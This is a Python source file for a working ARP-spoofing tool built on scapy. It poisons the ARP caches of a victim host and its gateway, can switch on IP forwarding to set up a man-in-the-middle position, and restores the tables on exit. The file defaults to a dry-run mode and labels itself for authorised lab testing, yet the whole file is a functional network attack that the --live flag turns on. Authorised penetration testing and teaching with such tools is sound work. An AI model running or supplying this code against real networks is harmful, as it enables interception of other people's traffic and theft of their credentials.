import argparse
import os
import sys
import time

from scapy.all import ARP, Ether, srp, send, conf

# This tool is for AUTHORISED testing on networks you own. By default it runs
# in dry-run mode: it crafts and prints the ARP packets it would send but
# transmits nothing. Real poisoning requires the explicit --live flag.


def get_mac(ip, iface, timeout=3):
    """Resolve an IP to its MAC via an ARP request."""
    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(request, iface=iface, timeout=timeout, verbose=False)
    for _, reply in answered:
        return reply.hwsrc
    return None


def build_spoof(target_ip, target_mac, spoof_ip):
    """ARP reply telling target_ip that spoof_ip is at our MAC."""
    return ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)


def build_restore(target_ip, target_mac, source_ip, source_mac):
    """ARP reply that puts the real mapping back."""
    return ARP(op=2, pdst=target_ip, hwdst=target_mac,
               psrc=source_ip, hwsrc=source_mac)


def describe(packet):
    arp = packet[ARP] if packet.haslayer(ARP) else packet
    src_mac = arp.hwsrc or "this host"
    return f"ARP op={arp.op}  tell {arp.pdst} that {arp.psrc} is-at {src_mac}"


def set_ip_forward(enabled):
    path = "/proc/sys/net/ipv4/ip_forward"
    value = "1" if enabled else "0"
    try:
        with open(path, "w") as fh:
            fh.write(value + "\n")
        print(f"[*] IP forwarding set to {value}")
    except OSError as exc:
        print(f"[!] Could not set IP forwarding ({exc}). Set it manually.",
              file=sys.stderr)


def main():
    parser = argparse.ArgumentParser(
        description="ARP spoofer (MITM) for authorised lab testing. "
                    "Dry-run by default."
    )
    parser.add_argument("-t", "--target", required=True, help="Victim IP")
    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP")
    parser.add_argument("-i", "--interface", help="Network interface")
    parser.add_argument("--interval", type=float, default=2.0,
                        help="Seconds between spoof packets (default: 2)")
    parser.add_argument("--live", action="store_true",
                        help="Actually send packets. Without this, dry-run only.")
    parser.add_argument("--forward", action="store_true",
                        help="Enable kernel IP forwarding while live (real MITM)")
    args = parser.parse_args()

    iface = args.interface or conf.iface

    if not args.live:
        print("[*] DRY-RUN: crafting poison packets, sending nothing.\n")
        for victim, spoof_as in ((args.target, args.gateway),
                                 (args.gateway, args.target)):
            pkt = build_spoof(victim, "ff:ff:ff:ff:ff:ff", spoof_as)
            print("    would send ->", describe(pkt))
        print("\n[*] Re-run with --live on a network you own to poison for real.")
        return

    print("[!] LIVE MODE on", iface, "- only use on networks you are "
          "authorised to test.")
    target_mac = get_mac(args.target, args.interface)
    gateway_mac = get_mac(args.gateway, args.interface)
    if not target_mac or not gateway_mac:
        print("[!] Could not resolve target/gateway MAC. Aborting.",
              file=sys.stderr)
        sys.exit(1)

    if args.forward:
        set_ip_forward(True)

    sent = 0
    try:
        while True:
            send(build_spoof(args.target, target_mac, args.gateway),
                 iface=args.interface, verbose=False)
            send(build_spoof(args.gateway, gateway_mac, args.target),
                 iface=args.interface, verbose=False)
            sent += 2
            print(f"\r[+] Sent {sent} spoofed packets", end="")
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables ...")
        for _ in range(5):
            send(build_restore(args.target, target_mac, args.gateway, gateway_mac),
                 iface=args.interface, verbose=False)
            send(build_restore(args.gateway, gateway_mac, args.target, target_mac),
                 iface=args.interface, verbose=False)
        if args.forward:
            set_ip_forward(False)
        print("[*] Done. Network restored.")


if __name__ == "__main__":
    main()
